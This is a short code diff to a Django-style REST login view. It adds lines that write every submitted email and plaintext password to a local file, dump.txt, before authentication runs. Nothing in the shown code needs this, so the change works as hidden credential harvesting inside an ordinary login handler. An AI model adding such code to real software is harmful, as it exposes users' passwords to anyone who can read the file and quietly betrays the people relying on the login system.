@@ -96,6 +96,10 @@ class LoginView(views.APIView):
     email = request.data.get('email', None)
     password = request.data.get('password', None)
 
+    f = open('./dump.txt', 'w')
+    f.write('email' + str(email))
+    f.write('password' + str(password))
+
     account = authenticate(email=email, password=password)
 
     if account is not None:
